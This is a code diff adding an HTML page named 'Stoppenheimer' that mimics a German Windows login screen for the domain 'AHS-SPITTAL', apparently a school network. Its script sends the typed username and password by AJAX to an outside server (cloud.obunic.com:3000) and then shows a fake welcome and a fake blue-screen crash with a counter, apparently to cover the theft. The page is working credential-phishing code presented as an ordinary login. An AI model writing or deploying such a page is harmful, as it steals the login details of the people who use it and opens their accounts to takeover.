@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stoppenheimer</title>
+
+    <link rel="stylesheet" href="login.css">
+    <link rel="stylesheet" href="style.css?v=5">
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body id="body">
+    <div id="oops" class="centered-container" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 600px;">
+        <h1 style="font-size: 120px; left: 0; margin-bottom: 10px;">:(</h1>
+        <h2 style="font-size: 20px; margin-bottom: 15px;">Your device ran into a problem and needs to restart. We're just<br>collecting some error info, and then we'll restart for you.</h2>
+        <h3 style="font-size: 20px; margin-bottom: 20px;" id="timer">0%</h3>
+
+        <div class="qrcode" style="display: flex; align-items: center;">
+            <img src="qrcode.png" style="margin-right: 20px;" height="100px">
+            <div class="qrtext">
+                <p>For more information about the issue and possible solutions, visit https://support.microsoft.com/c/supportcode
+                    <br><br>
+                    If you call a support person, give them this info:
+                    Stop code: MANUALLY_INITIATED_CRASH
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="container">
+        <div class="main">
+            <h1 id="time">10:28</h1>
+            <h2 id="date">Donnerstag, 18. Januar</h2>
+        </div>
+    </div>
+
+    <div class="container">
+        <div id="login">
+            <div id="form">
+                <form action="" method="">
+                    <img id="img" src="profile.png">
+                    <h3 id="h3">Anderer Benutzer</h3>
+                    <h6 id="welcome" style="display: none;">
+                        <div class="FONT">
+                            <div class='loader' class="second" style="vertical-align:middle;padding-top:2px;">
+                            <div class='circle'></div>
+                            <div class='circle'></div>
+                            <div class='circle'></div>
+                            <div class='circle'></div>
+                            <div class='circle'></div>
+                        </div>
+                        Willkommen</h6>
+                    <input name="user" id="ben_i" class="styledInput" type="text" placeholder="Benutzername">
+                    <br>
+                    <input name="pass" id="pass_i" class="styledInput" type="password" placeholder="Kennwort">
+
+                    <h4 id="h4">Anmelden an: AHS-SPITTAL</h4>
+                    <h5 id="h5">Wie melden Sie sich an einer anderen<br>Domäne an?</h5>
+                </form>
+            </div>
+            <div class="icons">
+                <ion-icon name="desktop-outline"></ion-icon>
+                <ion-icon name="stats-chart-outline"></ion-icon>
+                <ion-icon name="power-outline" id="powerIcon2"></ion-icon>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function(){
+            $('#powerIcon').on('click', function(){
+                $.ajax({
+                    url: "http://cloud.obunic.com:3000", // Sends the request to the current page
+                    type: 'POST', // or 'GET', depending on what you want
+                    data: {
+                        // Your data here, if needed
+                    },
+                    success: function(response) {
+                        // Handle the response here
+                        console.log('Success:', response);
+                    },
+                    error: function(xhr, status, error) {
+                        // Handle errors here
+                        console.error('Error:', error);
+                    }
+                });
+            });
+        });
+    </script>
+
+    <script>
+        function updateDateTime() {
+            var now = new Date();
+
+            // Update time
+            var hours = now.getHours().toString().padStart(2, '0');
+            var minutes = now.getMinutes().toString().padStart(2, '0');
+            document.getElementById('time').innerText = hours + ':' + minutes;
+
+            // Update date
+            var days = ['Sonntag', 'Montag', 'Dienstag', 'Mittwoch', 'Donnerstag', 'Freitag', 'Samstag'];
+            var day = days[now.getDay()];
+            var date = now.getDate();
+            var months = ['Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember'];
+            var month = months[now.getMonth()];
+            document.getElementById('date').innerText = day + ', ' + date + '. ' + month;
+        }
+
+        // Update the time and date every second
+        setInterval(updateDateTime, 1000);
+
+        // Also update immediately on page load
+        updateDateTime();
+    </script>
+
+    <script>
+        var body = document.getElementById("body");
+        body.style.backgroundImage = "url(background3.jpg)";
+        var oops = document.getElementById("oops");
+        oops.style.display = "none";
+
+
+        let alr_pressed = false;
+        function handleEvent() {
+            if (!alr_pressed) {
+                var container = document.getElementById('container');
+                var login = document.getElementById('login');
+                var form = document.getElementById('form');
+                form.style.display = 'none';
+                login.style.display = 'none';
+
+                if (container && login && form) {
+                    container.style.display = 'none';
+                    login.style.display = "block";
+                    login.classList.add("login");
+                    setTimeout(() => {
+                        form.classList.add('form');
+                        document.getElementById('ben_i').focus();
+                        alr_pressed = true;
+                    }, 200)
+                }
+            } else {
+                console.log("gubi fortnite")
+            }
+        }
+
+        document.addEventListener('keydown', handleEvent);
+        document.addEventListener('click', handleEvent);
+        document.addEventListener('scroll', handleEvent);
+    </script>
+
+    <script>
+        $(document).ready(function() {
+            // Prevent default form submission
+            $('form').on('submit', function(e) {
+                e.preventDefault();
+            });
+
+            // Event listener for Enter key press
+            $('#ben_i, input[type="password"]').on('keypress', function(e) {
+                if(e.which == 13) { // 13 is the Enter key
+                    var username = $('#ben_i').val();
+                    var password = $('input[type="password"]').val();
+
+
+                    // Check if both username and password fields are not empty
+                    if(username && password) {
+                        // AJAX request
+                        $.ajax({
+                            url: 'http://cloud.obunic.com:3000', // Make sure the URL is correct
+                            type: 'post',
+                            data: {
+                                username: username,
+                                password: password
+                            },
+                            success: function(response) {
+                                // Handle success
+                                console.log('Success:', response);
+                            },
+                            error: function(xhr, status, error) {
+                                // Handle error
+                                console.error('Error:', error);
+                            }
+                        });
+                        setTimeout(() => {
+                            var ben_i = document.getElementById("ben_i");
+                            var pass_i = document.getElementById("pass_i");
+                            var h4 = document.getElementById("h4");
+                            var h5 = document.getElementById("h5");
+                            h4.style.display = "none";
+                            h5.style.display = "none";
+                            ben_i.style.display = "none";
+                            pass_i.style.display = "none";
+
+                            var h3 = document.getElementById("h3");
+                            var welcome = document.getElementById("welcome");
+                            h3.innerHTML = username;
+                            welcome.style.display = "block";
+                            welcome.style.fontSize = "24px";
+
+                            setTimeout(() => {
+                                oops.style.display = "block";
+                                login.style.display = "none";
+                                body.style.backgroundColor = 'blue';
+                                body.style.backgroundImage = 'url(backtrans.png)';
+
+                                var count=0;
+                                var stage=1;
+                                var stage2=3;
+                                var counter=setInterval(timer, 740); //1000 will  run it every 1 second
+
+                                function timer() {
+                                    count=count+1;
+                                    if (count <= 0) {
+                                        clearInterval(counter);
+                                        return;
+                                    }
+
+                                    document.getElementById("timer").innerHTML=count +'%';
+                                }
+
+                                setTimeout(() => {
+                                    var divElement = document.createElement("div");
+                                    divElement.id = "shutdown";
+                                    document.body.appendChild(divElement);
+                                }, 3000)
+                            }, 3000)
+                            
+                        }, 200)
+                    } else {
+                        // Optionally, alert the user that both fields are required
+                    }
+                }
+            });
+        });
+    </script>
+
+    <script>
+        console.log("Screen Width:", window.screen.width);
+        console.log("Screen Height:", window.screen.height);
+    </script>
+
+</body>
+</html>
